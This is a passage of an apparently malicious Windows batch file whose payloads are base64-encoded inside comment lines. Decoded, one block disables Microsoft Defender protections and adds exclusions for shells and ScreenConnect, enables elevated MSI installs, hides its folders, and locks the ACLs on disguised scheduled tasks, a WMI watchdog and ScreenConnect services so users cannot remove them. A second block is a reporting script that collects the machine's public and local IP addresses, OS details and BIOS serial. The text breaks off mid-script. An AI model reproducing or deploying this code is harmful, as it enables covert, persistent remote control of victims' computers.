::xUYXNrcyINCg0KaWYgbm90IGV4aXN0ICIlV0QlIiBta2RpciAiJVdEJSIgPm51bCAyPiYxDQppZ
::iBub3QgZXhpc3QgIiVXRDIlIiBta2RpciAiJVdEMiUiID5udWwgMj4mMQ0KZWNobyBzZWN1cmVf
::YmVnaW4gJURBVEUlICVUSU1FJSBTND4+IiVMT0clIg0KDQpSRU0gLS0tIHBlci1ob3N0IGlkZW5
::0aXR5OiB3aGljaCB0YXNrIFhNTHMgYmVsb25nIHRvIHVzIC0tLQ0Kc2V0ICJUQVNLU19MSVNUPU
::1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTY2hlZHVsZWQgTWljcm9zb2Z0XFdpbmRvd3NcU
::ExBXFNlcnZlciBNaWNyb3NvZnRcV2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QgTWljcm9zb2Z0
::XFdpbmRvd3NcVGNwaXBcSXBBZGRyZXNzQ29uZmxpY3QxIg0KaWYgZXhpc3QgIiVXRCVcaWRlbnR
::pdHkuY2ZnIiAoDQogIHNldCAiVEFTS1NfTElTVD0iDQogIGZvciAvZiAidXNlYmFja3EgdG9rZW
::5zPTEsMiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxpZGVudGl0eS5jZmciKSBkbyAoDQogICAgc
::2V0ICJLPSUlSyINCiAgICBzZXQgIlY9JSVWIg0KICAgIGlmICIhSzp+MCw1ISI9PSJUQVNLXyIg
::c2V0ICJUQVNLU19MSVNUPSFUQVNLU19MSVNUISAhVjp+MSEiDQogICkNCikNCg0KUkVNIC0tLSB
::OZXV0cmFsaXplIE1TSSBibG9jayBwb2xpY2llcyAoMTYyNSkgLS0tDQpSRU0gRGlzYWJsZU1TST
::ogMD1hbGxvdywgMT1ub24tYWRtaW4gb25seSwgMj1hbGwgLT4gZm9yY2UgMA0KcmVnIGFkZCAiS
::EtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IERp
::c2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFN
::PRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgQWx3YXlzSW
::5zdGFsbEVsZXZhdGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGRlbGV0Z
::SAiSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92
::IERpc2FibGVNU0kgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0NVXFNPRlRXQVJFXFBvbGljaWV
::zXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgQWx3YXlzSW5zdGFsbEVsZXZhdGVkIC
::90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KDQpSRU0gLS0tIERlZmVuZGVyOiByZWdpc
::3RyeSBleGNsdXNpb25zIChwb2xpY3kgKyBwcmVmZXJlbmNlIGtleXMpIC0tLQ0KcmVnIGFkZCAi
::SEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciIgL3YgRGl
::zYWJsZUFudGlTcHl3YXJlIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZC
::AiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsL
::VRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAvdCBSRUdfRFdP
::UkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWl
::jcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibG
::VCZWhhdmlvck1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgY
::WRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJl
::YWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlSU9BVlByb3RlY3Rpb24gL3QgUkVHX0RXT1J
::EIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3
::Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlU
::2NyaXB0U2Nhbm5pbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHM
::iIC92ICIlV0QlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE
::1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL
::3YgIiVXRDIlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1c
::U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3Y
::gIkM6XFdpbmRvd3NcVGVtcCIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYW
::RkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcU
::GF0aHMiIC92ICIlVEVNUCUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFk
::ZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFB
::hdGhzIiAvdiAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90IFJFR19EV0
::9SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV
::2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGJVxTY3JlZW5Db25uZWN0
::IENsaWVudCAoJUtFRVAyJSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGF
::kZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXF
::BhdGhzIiAvdiAiJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSIgL3QgUkVHX
::0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29m
::dFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29
::ubmVjdCBDbGllbnQgKCVLRUVQMiUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCm
::ZvciAlJVAgaW4gKG1zaWV4ZWMuZXhlIGN1cmwuZXhlIGNtZC5leGUgcG93ZXJzaGVsbC5leGUgY
::2VydHV0aWwuZXhlIFNjcmVlbkNvbm5lY3QuQ2xpZW50U2VydmljZS5leGUgU2NyZWVuQ29ubmVj
::dC5XaW5kb3dzQ2xpZW50LmV4ZSkgZG8gKA0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3J
::vc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdC
::BSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2Z
::SBNcFByZWZlcmVuY2UgKHN0cm9uZ2VyIHRoYW4gcmVnIGFsb25lKSAtLS0NCnBvd2Vyc2hlbGwu
::ZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1
::Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZlcmVuY2U9J1NpbGVudGx5Q29udGludWUnOy
::IgXg0KICAiVHJ5e1NldC1NcFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJ
::HRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVCZWhhdmlvck1vbml0b3JpbmcgJHRydWU7
::IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZTsgU2V0LU1wUHJ
::lZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlfUNhdGNoe307IiBeDQogICIkcG
::F0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2luZG93c1xUZW1wJywkZW52OlRFTVAsJyVQRiVcU
::2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpJywnJVBGJVxTY3JlZW5Db25uZWN0IENsaWVu
::dCAoJUtFRVAyJSknLCclUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpJywnJVB
::GODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKScpOyIgXg0KICAidHJ5eyRwYXRocy
::s9QChHZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJvZ3JhbUZpbGVzIC1GaWx0ZXIgJ1NjcmVlb
::kNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEgMCB8IEZvckVhY2gtT2JqZWN0IHskXy5G
::dWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBmODY9W0Vudmlyb25tZW50XTo6R2V0Rm9
::sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRwZjg2KXskcGF0aHMrPUAoR2V0LUNoaW
::xkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5Db25uZWN0IENsaWVudConIC1EaXJlY
::3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9KX19Y2F0Y2h7fTsiIF4N
::CiAgImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZSkpeyBpZig
::kcCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSl7IEFkZC1NcFByZWZlcmVuY2UgLU
::V4Y2x1c2lvblBhdGggJHAgLUVBIDAgfSB9OyIgXg0KICAiZm9yZWFjaCgkeCBpbiBAKCdtc2lle
::GVjLmV4ZScsJ2N1cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hlbGwuZXhlJywnY2VydHV0aWwu
::ZXhlJywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScsJ1NjcmVlbkNvbm5lY3QuV2l
::uZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblByb2Nlc3MgJH
::ggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvbkV4dGVuc2lvbiAnL
::mNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBvbmx5
::IFNZU1RFTSArIEFkbWluaXN0cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAtLS0NCmNhbGwgOkxvY2t
::EaXIgIiVXRCUiDQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0tLSBoaWRlIHdvcmtkaX
::JzICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVXRCUiID5udWwgMj4mM
::Q0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpmb3IgJSVGIGluIChvd25fbW9uLmNt
::ZCBvd25fcnVuLmNtZCBldGxfbW9uLmNtZCB0Z19yZXBvcnQucHMxIG93bl9saWIucHMxIHBrZy5
::tc2kgbm90aWZ5LmNmZyBvd25fc2VjdXJlLmNtZCBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikgZG
::8gKA0KICBpZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwgM
::j4mMQ0KKQ0KaWYgZXhpc3QgIiVXRDIlXGV0bF9tb24uY21kIiBhdHRyaWIgK2ggK3MgIiVXRDIl
::XGV0bF9tb24uY21kIiA+bnVsIDI+JjENCg0KUkVNIC0tLSBBQ0w6IHNjaGVkdWxlZCB0YXNrIFh
::NTCAoaGFyZGVyIHRvIGRlbGV0ZSB3aXRob3V0IEFkbWluKSAtLS0NCmZvciAlJVQgaW4gKCVUQV
::NLU19MSVNUJSkgZG8gKA0KICBpZiBleGlzdCAiJVRBU0tST09UJVwlJX5UIiAoDQogICAgaWNhY
::2xzICIlVEFTS1JPT1QlXCUlflQiIC9pbmhlcml0YW5jZTpyID5udWwgMj4mMQ0KICAgIGljYWNs
::cyAiJVRBU0tST09UJVwlJX5UIiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZXFNZU1RFTTpGIiAiQlV
::JTFRJTlxBZG1pbmlzdHJhdG9yczpGIiA+bnVsIDI+JjENCiAgICBhdHRyaWIgK2ggK3MgIiVUQV
::NLUk9PVCVcJSV+VCIgPm51bCAyPiYxDQogICkNCikNCg0KUkVNIC0tLSBBQ0w6IFdNSSB3YXRja
::GRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIpIC0tLQ0KaWNhY2xzICIlU3lzdGVtUm9v
::dCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU0
::6RiIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBrZWVwIFNjcmVlbkNvbm5lY3QgaW5zdGFsbC
::BkaXJzIChvbmNlOyB0YWtlb3duIGV2ZXJ5IHRpY2sgaXMgbm9pc3kpIC0tLQ0KaWYgbm90IGV4a
::XN0ICIlV0QlXHNlY3VyZV9zYy5mbGFnIiAoDQogIGZvciAlJUQgaW4gKA0KICAgICIlUEYlXFNj
::cmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAiJVBGJVxTY3JlZW5Db25uZWN0IEN
::saWVudCAoJUtFRVAyJSkiDQogICAgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRV
::AxJSkiDQogICAgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICkgZ
::G8gKA0KICAgIGlmIGV4aXN0ICIlJX5EIiBjYWxsIDpMb2NrRGlyICIlJX5EIg0KICApDQogIGVj
::aG8gc2NfbG9ja2VkPiVXRCVcc2VjdXJlX3NjLmZsYWcNCikNCg0KUkVNIC0tLSBTQyBzZXJ2aWN
::lczogU1lTVEVNIGNhbiBjb25maWcvc3RvcC9kZWxldGU7IEJBIGZ1bGw7IHVzZXJzIGJsb2NrZW
::QgLS0tDQpSRU0gU1k6IENDIERDIExDIFNXIFJQIERUIExPIFJDICAobm8gU0QgLT4gY2Fubm90I
::GNoYW5nZSB0aGlzIFNEIGl0c2VsZikNCnNldCAiU0Q9RDooQTs7Q0NEQ0xDU1dSUFdQRFRMT0NS
::UkM7OztTWSkoQTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5leGUgc2R
::zZXQgIiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxUJSIgIiVTRC
::UiID5udWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJVBSSU0lIiBzdGFydD0gYXV0byA+bnVsIDI+J
::jENCnNjLmV4ZSBjb25maWcgIiVBTFQlIiBzdGFydD0gYXV0byA+bnVsIDI+JjENCnNjLmV4ZSBm
::YWlsdXJlICIlUFJJTSUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzYwMDAwL3Jlc3R
::hcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjENCnNjLmV4ZSBmYWlsdXJlICIlQUxUJS
::IgcmVzZXQ9IDg2NDAwIGFjdGlvbnM9IHJlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMC9yZXN0Y
::XJ0LzYwMDAwID5udWwgMj4mMQ0KDQplY2hvIHNlY3VyZV9kb25lPj4iJUxPRyUiDQpleGl0IC9i
::IDANCg0KOkxvY2tEaXINCnNldCAiVD0lfjEiDQppZiBub3QgZXhpc3QgIiVUJSIgZXhpdCAvYiA
::wDQpSRU0gdGFrZSBvd25lcnNoaXAgdGhlbiBzdHJpcCBpbmhlcml0ZWQgQUNFczsgU1lTVEVNK0
::FkbWlucyBvbmx5DQp0YWtlb3duIC9GICIlVCUiIC9SIC9EIFkgPm51bCAyPiYxDQppY2FjbHMgI
::iVUJSIgL2luaGVyaXRhbmNlOnIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL2dyYW50OnIgIk5U
::IEFVVEhPUklUWVxTWVNURU06KE9JKShDSSlGIiAiQlVJTFRJTlxBZG1pbmlzdHJhdG9yczooT0k
::pKENJKUYiID5udWwgMj4mMQ0KaWNhY2xzICIlVCUiIC9yZW1vdmU6ZyAiVXNlcnMiICJBdXRoZW
::50aWNhdGVkIFVzZXJzIiAiRXZlcnlvbmUiICJOVCBBVVRIT1JJVFlcSU5URVJBQ1RJVkUiICJCV
::UlMVElOXFVzZXJzIiA+bnVsIDI+JjENCmV4aXQgL2IgMA0K
::B64_SEC_END
::B64_TGR_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4MDJUNyAtIGl
::kZW50aXR5LWF3YXJlIHRhc2tzICsgY29tcGFjdCBkaWdlc3QgbW9kZQ0KcGFyYW0oDQogICAgW1
::BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kU3RhdGUsDQogICAgW3N0cmluZ
::10kU3VtbWFyeSA9ICcnLA0KICAgIFtzdHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3JhbURhdGFc
::TWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUnLA0KICAgIFtzdHJpbmddJE9sZFN
::0YXRlID0gJycsDQogICAgW1ZhbGlkYXRlU2V0KCdyaWNoJywgJ2NvbXBhY3QnKV1bc3RyaW5nXS
::RNb2RlID0gJ3JpY2gnLA0KICAgIFtzdHJpbmddJEJ1aWxkID0gJ08xNScsDQogICAgW3N0cmluZ
::10kQ291bnQgPSAnMCcNCikNCg0KJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNv
::bnRpbnVlJw0KJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJw0KdHJ5IHs
::gW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdX
::JpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9DQoNCmZ1bmN0aW9uIEdldC1DZmcge
::w0KICAgICRwYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdub3RpZnkuY2ZnJw0KICAgICRjZmcg
::PSBAe30NCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRwYXRoKSkgeyByZXR1cm4gJGNmZyB9DQo
::gICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwgRm9yRWFjaC1PYmplY3Qgew0KIC
::AgICAgICBpZiAoJF8gLW1hdGNoICdeXHMqKFtBLVphLXowLTlfXSspXHMqPVxzKiguKilccyokJ
::ykgew0KICAgICAgICAgICAgJGNmZ1skbWF0Y2hlc1sxXV0gPSAkbWF0Y2hlc1syXS5UcmltKCkN
::CiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJGNmZw0KfQ0KDQpmdW5jdGlvbiBFc2MoW3N
::0cmluZ10kcykgew0KICAgIGlmICgkbnVsbCAtZXEgJHMpIHsgcmV0dXJuICcnIH0NCiAgICByZX
::R1cm4gKCRzIC1yZXBsYWNlICcmJywgJyZhbXA7JyAtcmVwbGFjZSAnPCcsICcmbHQ7JyAtcmVwb
::GFjZSAnPicsICcmZ3Q7JykNCn0NCg0KZnVuY3Rpb24gR2V0LVB1YmxpY0lwIHsNCiAgICBmb3Jl
::YWNoICgkdSBpbiBAKA0KICAgICAgICAgICAgJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycsDQogICA
::gICAgICAgICAnaHR0cHM6Ly9pZmNvbmZpZy5tZS9pcCcsDQogICAgICAgICAgICAnaHR0cHM6Ly
::9pY2FuaGF6aXAuY29tJw0KICAgICAgICApKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgI
::CAkciA9IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHUgLVVzZUJhc2ljUGFyc2luZyAtVGltZW91
::dFNlYyA2DQogICAgICAgICAgICAkaXAgPSAoJHIuQ29udGVudCB8IE91dC1TdHJpbmcpLlRyaW0
::oKQ0KICAgICAgICAgICAgaWYgKCRpcCAtbWF0Y2ggJ15cZHsxLDN9KFwuXGR7MSwzfSl7M30kJy
::Atb3IgJGlwIC1tYXRjaCAnOicpIHsgcmV0dXJuICRpcCB9DQogICAgICAgIH0gY2F0Y2gge30NC
::iAgICB9DQogICAgcmV0dXJuICduL2EnDQp9DQoNCmZ1bmN0aW9uIEdldC1Mb2NhbElwcyB7DQog
::ICAgdHJ5IHsNCiAgICAgICAgJGlwcyA9IEdldC1OZXRJUEFkZHJlc3MgLUFkZHJlc3NGYW1pbHk
::gSVB2NCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBXaGVyZS
::1PYmplY3QgeyAkXy5JUEFkZHJlc3MgLW5vdGxpa2UgJzEyNy4qJyAtYW5kICRfLlByZWZpeE9ya
::WdpbiAtbmUgJ1dlbGxLbm93bicgfSB8DQogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1FeHBh
::bmRQcm9wZXJ0eSBJUEFkZHJlc3MgLVVuaXF1ZQ0KICAgICAgICBpZiAoJGlwcykgeyByZXR1cm4
::gKCRpcHMgLWpvaW4gJywgJykgfQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgIC
::AkaXBzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvb
::iAtRmlsdGVyICdJUEVuYWJsZWQ9VHJ1ZScgfA0KICAgICAgICAgICAgRm9yRWFjaC1PYmplY3Qg
::eyAkXy5JUEFkZHJlc3MgfSB8IFdoZXJlLU9iamVjdCB7ICRfIC1hbmQgJF8gLW5vdGxpa2UgJzE
::yNy4qJyAtYW5kICRfIC1ub3RsaWtlICcqOionIH0NCiAgICAgICAgaWYgKCRpcHMpIHsgcmV0dX
::JuICgoJGlwcyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZSkgLWpvaW4gJywgJykgfQ0KICAgIH0gY
::2F0Y2gge30NCiAgICByZXR1cm4gJ24vYScNCn0NCg0KZnVuY3Rpb24gR2V0LU9zSW5mbyB7DQog
::ICAgJG8gPSBbb3JkZXJlZF1Aew0KICAgICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24gPSA
::nbi9hJzsgQnVpbGQgPSAnbi9hJzsgQXJjaCA9ICduL2EnDQogICAgICAgIERvbWFpbiA9ICduL2
::EnOyBJbnN0YWxsRGF0ZSA9ICduL2EnOyBMYXN0Qm9vdCA9ICduL2EnDQogICAgICAgIENQVSA9I
::CduL2EnOyBNYW51ZmFjdHVyZXIgPSAnbi9hJzsgTW9kZWwgPSAnbi9hJzsgU2VyaWFsID0gJ24v
::YScNCiAgICAgICAgVG90YWxSQU1fR0IgPSAnbi9hJzsgRGlza0ZyZWVfR0IgPSAnbi9hJzsgRGl
::za1NpemVfR0IgPSAnbi9hJw0KICAgIH0NCiAgICB0cnkgew0KICAgICAgICAkb3MgPSBHZXQtQ2
::ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5nU3lzdGVtDQogICAgICAgICRvLkNhcHRpb24gPSAkb
::3MuQ2FwdGlvbg0KICAgICAgICAkby5WZXJzaW9uID0gJG9zLlZlcnNpb24NCiAgICAgICAgJG8u
::QnVpbGQgPSAkb3MuQnVpbGROdW1iZXINCiAgICAgICAgJG8uQXJjaCA9ICRvcy5PU0FyY2hpdGV
::jdHVyZQ0KICAgICAgICAkby5JbnN0YWxsRGF0ZSA9ICgkb3MuSW5zdGFsbERhdGUgfCBHZXQtRG
::F0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkJykNCiAgICAgICAgJG8uTGFzdEJvb3QgPSAoJG9zLkxhc
::3RCb290VXBUaW1lIHwgR2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbScpDQogICAg
::ICAgICRvLlRvdGFsUkFNX0dCID0gW21hdGhdOjpSb3VuZCgkb3MuVG90YWxWaXNpYmxlTWVtb3J
::5U2l6ZSAvIDFNQiwgMSkNCiAgICB9IGNhdGNoIHt9DQogICAgdHJ5IHsNCiAgICAgICAgJGNzID
::0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0NvbXB1dGVyU3lzdGVtDQogICAgICAgICRvLkRvbWFpb
::iA9IGlmICgkY3MuUGFydE9mRG9tYWluKSB7ICRjcy5Eb21haW4gfSBlbHNlIHsgJGNzLldvcmtn
::cm91cCB9DQogICAgICAgICRvLk1hbnVmYWN0dXJlciA9ICRjcy5NYW51ZmFjdHVyZXINCiAgICA
::gICAgJG8uTW9kZWwgPSAkY3MuTW9kZWwNCiAgICB9IGNhdGNoIHt9DQogICAgdHJ5IHsNCiAgIC
::AgICAgJG8uQ1BVID0gKEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzb3IgfCBTZWxlY3QtT
::2JqZWN0IC1GaXJzdCAxIC1FeHBhbmRQcm9wZXJ0eSBOYW1lKQ0KICAgIH0gY2F0Y2gge30NCiAg
::ICB0cnkgew0KICAgICAgICAkby5TZXJpYWwgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX0JJT1M
::pLlNlcmlhbE51bWJlcg0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkZCA9IE
::dldC1DaW1JbnN0YW5jZSBXaW4zMl9Mb2dpY2FsRGlzayAtRmlsdGVyICJEZXZpY2VJRD0nQzonI
::g0KICAgICAgICAkby5EaXNrRnJlZV9HQiA9IFttYXRoXTo6Um91bmQoJGQuRnJlZVNwYWNlIC8g
::MUdCLCAxKQ0KICAgICAgICAkby5EaXNrU2l6ZV9HQiA9IFttYXRoXTo6Um91bmQoJGQuU2l6ZSA
::vIDFHQiwgMSkNCiAgICB9IGNhdGNoIHt9DQogICAgcmV0dXJuICRvDQp9DQoNCmZ1bmN0aW9uIE
::dldC1TdmNMaW5lKFtzdHJpbmddJG5hbWUpIHsNCiAgICAkcyA9IEdldC1TZXJ2aWNlIC1OYW1lI
::CRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgaWYgKC1ub3QgJHMpIHsg
::cmV0dXJuICdOT1QgSU5TVEFMTEVEJyB9DQogICAgcmV0dXJuICgnezB9IChTdGFydD17MX0pJyA
::tZiAkcy5TdGF0dXMsICRzLlN0YXJ0VHlwZSkNCn0NCg0KZnVuY3Rpb24gR2V0LVRhc2tIZWFsdG
::goW3N0cmluZ10kdG4pIHsNCiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkd
::G4gL0ZPIExJU1QgL1YgMj4kbnVsbA0KICAgIGlmICgkTEFTVEVYSVRDT0RFIC1uZSAwIC1vciAt
::bm90ICRvdXQpIHsNCiAgICAgICAgcmV0dXJuIEB7IFByZXNlbnQgPSAkZmFsc2U7IFN0YXR1cyA
::9ICdNSVNTSU5HJzsgTmV4dCA9ICcnOyBMYXN0ID0gJyc7IFJlc3VsdCA9ICcnIH0NCiAgICB9DQ
::ogICAgJG1hcCA9IEB7fQ0KICAgIGZvcmVhY2ggKCRsaW5lIGluICRvdXQpIHsNCiAgICAgICAga
::WYgKCRsaW5lIC1tYXRjaCAnXlxzKihbXjpdKyk6XHMqKC4qKVxzKiQnKSB7DQogICAgICAgICAg
::ICAkbWFwWyRtYXRjaGVzWzFdLlRyaW0oKV0gPSAkbWF0Y2hlc1syXS5UcmltKCkNCiAgICAgICA
::gfQ0KICAgIH0NCiAgICAkc3RhdHVzID0gJG1hcFsnU3RhdHVzJ10NCiAgICBpZiAoLW5vdCAkc3
